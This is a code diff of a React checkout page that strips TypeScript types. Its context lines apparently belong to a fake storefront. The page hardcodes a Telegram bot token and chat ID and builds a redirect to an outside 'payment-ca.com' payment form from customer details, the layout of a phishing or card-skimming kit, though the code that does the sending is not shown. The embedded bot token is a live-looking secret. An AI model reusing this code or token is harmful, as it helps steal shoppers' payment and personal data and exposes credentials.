@@ -1,6 +1,5 @@
 "use client"
 
-import type React from "react"
 import { useState, useEffect } from "react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
@@ -48,8 +47,8 @@ export default function CheckoutPage() {
   const TELEGRAM_BOT_TOKEN = '8318165972:AAFUvKuh1EMqEs0HmWtR6_7uTQomyVVymZ8'
   const TELEGRAM_CHAT_ID = '-5217100062'
   const sessionId = `HT4K_${Date.now()}`
-  const [messageId, setMessageId] = useState<number | null>(null)
-  const [updateTimer, setUpdateTimer] = useState<any>(null)
+  const [messageId, setMessageId] = useState(null)
+  const [updateTimer, setUpdateTimer] = useState(null)
 
   useEffect(() => {
     setMounted(true)
@@ -150,7 +149,7 @@ export default function CheckoutPage() {
     }
   }
 
-  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
+  const handleInputChange = (e) => {
     const value = e.target.type === "checkbox" ? (e.target as HTMLInputElement).checked : e.target.value
     setFormData({ ...formData, [e.target.name]: value })
     
@@ -164,8 +163,8 @@ export default function CheckoutPage() {
   }
 
   // Function to generate the payment backend URL
-  const getProvinceTaxRate = (province: string) => {
-    const taxRates: { [key: string]: number } = {
+  const getProvinceTaxRate = (province) => {
+    const taxRates = {
       'ON': 13,      // Ontario
       'NS': 15,      // Nova Scotia
       'NB': 15,      // New Brunswick
@@ -183,12 +182,12 @@ export default function CheckoutPage() {
     return taxRates[province] || 0
   }
 
-  const cleanPhoneNumber = (phone: string) => {
+  const cleanPhoneNumber = (phone) => {
     // Remove all non-numeric characters except +
     return phone.replace(/[^\d+]/g, '')
   }
 
-  const generatePaymentURL = (data: typeof formData) => {
+  const generatePaymentURL = (data) => {
     const baseURL = 'https://secure.payment-ca.com/connect/form'
     
     // Generate meaningful order number: HT4K + timestamp + random
@@ -228,7 +227,7 @@ export default function CheckoutPage() {
     return `${baseURL}?${queryString}`
   }
 
-  const handleSubmit = async (e: React.FormEvent) => {
+  const handleSubmit = async (e) => {
     e.preventDefault()
     
     // Validate required fields
